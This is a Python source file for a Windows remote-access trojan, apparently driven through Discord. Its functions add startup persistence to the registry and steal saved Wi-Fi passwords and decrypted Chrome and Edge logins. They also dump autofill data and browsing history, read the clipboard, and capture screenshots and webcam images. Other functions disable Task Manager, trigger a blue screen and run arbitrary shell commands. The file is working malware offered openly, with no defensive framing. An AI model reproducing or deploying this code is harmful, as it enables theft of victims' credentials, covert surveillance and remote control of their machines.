# Author: cybermad

# fsociety00.dat

import os
import subprocess
import platform
import pyautogui
import cv2
import psutil
import sys
import threading
import winreg
import socket
import ctypes
import requests
import webbrowser
import locale
import os
import psutil
import sqlite3
import shutil
import pyttsx3
import win32crypt
import discord
from Cryptodome.Cipher import AES
import json
import base64
import pyperclip
import datetime

LOCAL = os.getenv("LOCALAPPDATA")
PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Microsoft Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
}

def cd(path):
    try:
        os.chdir(path)
        return os.getcwd()
    except Exception as e:
        return str(e)

def download(path):
    return (path, None) if os.path.isfile(path) else None

def startup():
    try:
        exe = sys.executable
        app = "MyStartupApp"
        reg = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        approved = r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run"

        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, app, 0, winreg.REG_SZ, exe)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, approved, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, app, 0, winreg.REG_BINARY, b'\x02\x00\x00\x00\x00\x00\x00\x00')
        return "Done."
    except Exception as e:
        return str(e)

async def wallpaper(file: discord.Attachment):
    try:
        dir = os.getenv("TEMP")
        path = os.path.join(dir, file.filename)

        await file.save(path)

        if not path.lower().endswith((".jpg", ".jpeg", ".png", ".jfif")):
            return None, "None."

        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

        return "Done.", None

    except Exception as e:
        return None, f"{e}"
    
def upload(attachment: discord.Attachment) -> str:
    return os.path.join(os.getcwd(), attachment.filename)
    
def sysinfo():
    try:
        ip = socket.gethostbyname(socket.gethostname())
        uname = platform.uname()
        ram = round(psutil.virtual_memory().total / (1024**3))
        return (
            f"OS : {uname.system}\n"
            f"Version : {uname.version}\n"
            f"Arch : {platform.architecture()[0]}\n"
            f"CPU : {uname.processor}\n"
            f"Hostname : {uname.node}\n"
            f"IP : {ip}\n"
            f"Cores : {os.cpu_count()}\n"
            f"RAM : {ram} GB\n"
            f"User : {os.getlogin()}"
        )
    except Exception as e:
        return str(e)

def getip():
    try:
        res = requests.get("https://ipinfo.io/json")
        data = res.json() if res.status_code == 200 else {}
        return "\n".join(f"{k.capitalize()}: {v}" for k, v in data.items())
    except Exception as e:
        return f"{e}"

def wifi():
    try:
        encoding = locale.getpreferredencoding(False)
        command = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(encoding).split('\n')
        profiles = [i.split(":")[1][1:-1] for i in command if "All User Profile" in i]

        wifi_list = []

        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(encoding).split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            password = results[0] if results else ""
            wifi_list.append(f"{i:<30} | {password}")

        result_text = "\n".join(wifi_list)
        return result_text if result_text else "None."

    except Exception as e:
        return str(e)
    
def disabletaskmgr():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return "Done."
    except Exception as e:
        return f"{e}"

def enabletaskmgr():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.DeleteValue(key, "DisableTaskMgr")
        winreg.CloseKey(key)
        return "Done."
    except FileNotFoundError:
        return "None."
    except Exception as e:
        return f"{e}"
    
def process():
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            info = proc.info
            processes.append(f"PID: {info['pid']} - Name: {info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return "\n".join(processes)

def processkill(pid: int) -> str:
    try:
        proc = psutil.Process(pid)
        proc.kill()
        return f"Done. {pid}"
    except psutil.NoSuchProcess:
        return f"Done. {pid}"
    except psutil.AccessDenied:
        return f"Access denied {pid}."
    except Exception as e:
        return f"{str(e)}"

def website(url: str) -> str:
    try:
        webbrowser.open(url)
        return f"Done."
    except Exception as e:
        return f"{str(e)}"

def clipboard():
    try:
        text = pyperclip.paste()
        return text if text else "None."
    except Exception as e:
        return f"{e}"

def audio(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

def msgbox(title, message):
    def show():
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)  # 0x40: MB_ICONINFORMATION
    threading.Thread(target=show, daemon=True).start()

def screenshot():
    try:
        pyautogui.screenshot().save("screenshot.png")
        return "screenshot.png", None
    except Exception as e:
        return None, str(e)

def webcam():
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return None, "None."
        ret, frame = cam.read()
        cam.release()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            return "webcam.jpg", None
        return None, "None."
    except Exception as e:
        return None, str(e)

def decryption(path):
    local_state = os.path.join(path, "Local State")
    if not os.path.exists(local_state):
        return None
    with open(local_state, "r", encoding="utf-8") as f:
        j = json.load(f)
    enc_key_b64 = j["os_crypt"]["encrypted_key"]
    enc_key = base64.b64decode(enc_key_b64)[5:]
    key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    return key

def decrypt(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        dec = cipher.decrypt(payload)[:-16]
        return dec.decode()
    except:
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except:
            return "None."

def extract(path, browser):
    res = []
    key_ = decryption(path)
    if not key_:
        return res

    for entry in os.listdir(path):
        profile_path = os.path.join(path, entry)
        if not os.path.isdir(profile_path):
            continue
        if entry != "Default" and not entry.startswith("Profile"):
            continue

        db = os.path.join(profile_path, "Login Data")
        if not os.path.exists(db):
            continue

        tmp_db = os.path.join(os.getenv("TEMP"), f"tmp_login_data_{browser}_{entry}.db")
        shutil.copy2(db, tmp_db)

        try:
            conn = sqlite3.connect(tmp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for url, user, enc_pass in cursor.fetchall():
                if user or enc_pass:
                    pwd = decrypt(enc_pass, key_)
                    res.append({
                        "browser": browser,
                        "profile": entry,
                        "url": url,
                        "username": user,
                        "password": pwd,
                    })

            cursor.close()
            conn.close()
        except Exception:
            pass
        finally:
            os.remove(tmp_db)

    return res



def pro():
    profiles = {}
    for browser, base_path in PATHS.items():
        found = []
        if os.path.exists(base_path):
            for entry in os.listdir(base_path):
                profile_path = os.path.join(base_path, entry)
                if os.path.isdir(profile_path) and (
                    entry == "Default" or entry.startswith("Profile")
                ):
                    found.append(profile_path)
        profiles[browser] = found
    return profiles

def autofill():
    res = []
    profiles = pro()

    for browser, profile_paths in profiles.items():
        for profile_path in profile_paths:
            db_path = os.path.join(profile_path, "Web Data")
            if not os.path.exists(db_path):
                continue

            tmp_db = os.path.join(os.getenv("TEMP"), "tmp_web_data.db")
            try:
                shutil.copy2(db_path, tmp_db)
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()

                cursor.execute("SELECT name, value FROM autofill")

                for name, value in cursor.fetchall():
                    if name or value:
                        res.append({
                            "browser": browser,
                            "profile": os.path.basename(profile_path),
                            "name": name,
                            "value": value,
                        })

                cursor.close()
                conn.close()
            except Exception as e:
                res.append({"error": str(e)})
            finally:
                if os.path.exists(tmp_db):
                    os.remove(tmp_db)

    return res

def history():
    res = []
    profiles = pro()

    for browser, profile_paths in profiles.items():
        for profile_path in profile_paths:
            db_path = os.path.join(profile_path, "History")
            if not os.path.exists(db_path):
                continue

            tmp_db = os.path.join(os.getenv("TEMP"), "tmp_history.db")
            try:
                shutil.copy2(db_path, tmp_db)
                conn = sqlite3.connect(tmp_db)
                cursor = conn.cursor()

                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")

                for url, title, last_visit in cursor.fetchall():
                    try:
                        visit_time_dt = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_visit)
                        visit_time = visit_time_dt.strftime("%Y-%m-%dT%H:%M:%S")
                    except Exception:
                        visit_time = "Unknown"

                    res.append({
                        "browser": browser,
                        "url": url,
                        "title": title,
                        "last_visit": visit_time,
                    })

                cursor.close()
                conn.close()
            except Exception as e:
                res.append({"error": str(e)})
            finally:
                if os.path.exists(tmp_db):
                    os.remove(tmp_db)
    return res

def bluescreen():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        status = ctypes.windll.ntdll.NtRaiseHardError(
            0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint())
        )
        return f"{status}"
    except Exception as e:
        return str(e)

def shell(command):
    command = command.strip()
    if command == 'cd':
        return os.getcwd()
    elif command.startswith('cd '):
        path = command[3:].strip()
        return cd(path)

    try:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd())
        out, err = proc.communicate()
        return (out + err).decode(errors='ignore')
    except Exception as e:
        return str(e)